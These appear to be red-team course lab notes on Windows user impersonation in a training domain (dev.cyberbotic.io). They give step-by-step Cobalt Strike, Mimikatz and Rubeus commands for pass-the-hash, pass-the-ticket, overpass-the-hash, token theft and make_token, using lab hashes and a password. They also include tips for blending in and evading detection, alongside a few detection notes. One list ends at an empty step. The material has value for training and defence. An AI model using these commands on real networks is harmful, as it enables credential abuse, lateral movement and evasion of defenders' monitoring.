# User Impersonation

There are techniques which use stolen creds to access one of the target computers. There are also techniques that don't use credentials directly, but take advantage of processes that the user is running on a machine we have elevated access on. Test elevated access to a machine by listing the C drive, as this requires local admin.

## Pass the Hash

Allows you to authenticate to a Windows service using a user's NTLM hash. It starts a new session with a fake identity and then replaces the session information with the domain, username, and NTLM hash provided. 

Beacon has a ```pth``` command that executes Mimikatz in the background (requires elevated privs).

In lab, on beacon prompt:

1. ```getuid``` - find out who I am
2. ```ls \\web.dev.cyberbotic.io\c$``` - attempt to list the C$ share of the WEB machine (this will fail because bfarmer is not a local admin)
3. ```pth DEV\jking 59fc0f884922b4ce376051134c71e22c``` - run ```pth``` with jking's username and NTLM hash; Mimiktaz passes the new credentials over a named pipe, which Beacon then impersonates automatically
4. ```ls \\web.dev.cyberbotic.io\c$``` - attempt to list the C$ share works now!
5. ```rev2self``` - drop impersonation when no longer needed

Two ways to detect ```pth```:
* The R/W handle to LSASS (access mask of 0x1038)
* Look for ```echo foo > \\.\pipe\bar``` pattern in command-line logs (via the "Suspicious Named Pipe Impersonation" search)

## Pass the Ticket

Allows you to add Kerberos tickets to an existing logon session (LUID) that you have access to or a new one you create. Accessing a remote resource will then allow that authentication to happen via Kerberos.

Use the TGT extracted from the logon session on Workstation 2. Create a blank, "sacrificial" logon session that we can pass the TGT into (can only hold a single TGT at a time -- also, passing jking's TGT into bfarmer's LUID would erase bfarmer's TGT and cause all sorts of authentication issues for the user)

1. ```execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe``` - start a new hidden process of your choice; also creates a new ticketless LUID
2. ```execute-assembly Rubeus.exe ptt /luid:0x798c2c /ticket:doIF...LklP``` - pass the TGT into this new LUID
3. ```steal_token 4748``` - impersonate the process that we created using the PID createnetonly returned
4. To clean up:
   * ```rev2self```
   * ```kill <PID>```

Rubeus defaults to a random username, domain, and password, which will appear in the associated <PID> logon event. The "Suspicious Logon Events" saved search will show 4624's where the TargetOutboundDomainName is not an expected value. To set these values (password doesn't have to be real):

```execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123```

## Overpass the Hash

Allows us to request a Kerberos TGT for a user, using their NTLM or AES hash. Elevated privs are required to obtain user hashes, but not to request a ticket.

* ```execute-assembly Rubeus.exe asktgt /user:jking ntlm:59fc...e22c /nowrap``` - use the returned TGT for Pass the Ticket (but this stands out in the logs since NTLM uses RC4)
* ```execute-assembly Rubeus.exe asktgt /user:jking aes256:4a8...57c6 /nowrap``` - to get an AES256 TGT; gets logged as 4768, but blends in (except Ticket Options and Supplied Realm Name; uses the FQDN of the domain of the computer)
* ```execute-assembly Rubeus.exe asktgt /user:jking aes256:4a8...57c6 /domain:DEV /opsec /nowrap``` - uses the NETBIOS name and correct Ticket Options to blend in better

Rubeus' method doesn't touch LSASS (unlike Mimikatz) but does generate Kerberos traffic from an odd process, not LSASS.  These can be seen using the "Kerberos Traffic from Suspicious Process" saved search.

## Token Impersonation

If we elevate or are on a system where a user is running a process, we can impersonate the token. Get a handle to the target process, open and copy its primary access token, and then impersonate that token. Ability to abuse it goes away when the user closes the process. By taking the additional steps of extracting tickets or hashes, we provide ourselves a more guaranteed or "future-proof" way of using the creds. When impersonating users, CS shows who the beacon is impersonating.

1. List the running processes on Workstation 2 from an elevated prompt to see that jking is running an instance of ```mmc``` (in PS ```Get-Process```).
2. ```steal_token <PID>``` to access a target
3. ```ls \\web.dev.cyberbotic.io\c$``` to show elev access 
4. 

## Token Store

CS can store tokens stolen for future use. Stealing a token opens a handle to the target process and process token, so the fewer times it's done the better. Also, keeping a token prevents the OS from closing the session if they log off.

* ```token-store steal <PID>``` - steal token
* ```token-store show``` - show tokens
* ```token-store use <ID>``` - use a token
* ```token-store remove <ID>``` - delete token
* ```token-store remove-all``` - flush tokens

## Make Token

Impersonate a user with their plaintext password. Uses [LogonUserA](https://learn.microsoft.com/en-gb/windows/win32/api/winbase/nf-winbase-logonusera) API. 

* ```make_token DEV\jking Qwerty123``` 


